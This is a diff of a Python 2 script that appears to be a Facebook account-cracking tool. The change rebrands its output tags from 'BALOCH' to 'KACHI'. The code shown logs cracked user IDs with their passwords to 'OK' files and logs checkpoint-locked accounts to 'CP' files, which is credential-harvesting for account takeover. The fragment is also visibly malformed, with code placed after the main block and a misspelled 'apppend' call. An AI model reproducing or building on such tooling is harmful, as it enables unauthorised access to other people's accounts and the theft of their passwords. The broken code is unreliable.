@@ -1181,14 +1181,14 @@ def n_s():
 if __name__ == '__main__':
     reg()
                        if 'loc' in q:
-                                            print '\x1b[1;92m[BALOCH-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
-                                            ok = open('/sdcard/ids/BALOCH_OK.txt', 'a')
+                                            print '\x1b[1;92m[KACHI-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            ok = open('/sdcard/ids/KACHI_OK.txt', 'a')
                                             ok.write(uid + ' | ' + pass8 + '\n')
                                             ok.close()
                                             oks.append(uid + pass8)
                                         elif 'www.facebook.com' in q['error']:
-                                            print '\x1b[1;31;1m[BALOCH-CP] ' + uid + ' | ' + pass8
-                                            cp = open('BALOCH_CP.txt', 'a')
+                                            print '\x1b[1;31;1m[KACHI-CP] ' + uid + ' | ' + pass8
+                                            cp = open('KACHI_CP.txt', 'a')
                                             cp.write(uid + ' | ' + pass8 + '\n')
                                             cp.close()
                                             cps.apppend(uid + pass8)
